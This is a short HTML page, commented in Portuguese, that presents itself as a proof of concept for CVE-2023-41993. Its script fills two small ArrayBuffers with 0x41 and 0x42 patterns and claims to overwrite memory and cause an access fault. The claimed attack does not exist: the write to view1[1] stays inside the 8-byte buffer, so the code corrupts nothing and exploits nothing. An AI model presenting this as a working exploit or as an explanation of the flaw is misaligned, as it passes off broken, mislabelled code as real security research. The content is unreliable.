<body>
    <h1>PoC CVE-2023-41993</h1>
    <p>Testando a vulnerabilidade CVE-2023-41993.</p>

    <script>
        // O código fornecido será adicionado aqui sem alterações

        let buffer1 = new ArrayBuffer(8);  // Cria buffer de 8 bytes
        let view1 = new Uint32Array(buffer1);  // Cria um "view" de 32 bits para o buffer
        view1[0] = 0x41414141;  // Preenche com um valor (pode ser usado para representar dados de controle)

        // Criando outro buffer que será manipulado para corromper o primeiro buffer
        let buffer2 = new ArrayBuffer(8);
        let view2 = new Uint32Array(buffer2);
        view2[0] = 0x42424242;

        console.log("Buffer1 initial value:", view1[0]);
        console.log("Buffer2 initial value:", view2[0]);

        // Tentando sobrescrever dados de memória
        view1[1] = view2[0];  // Manipula para gerar falha de acesso
        console.log("Modified Buffer1:", view1[0], view1[1]);
    </script>
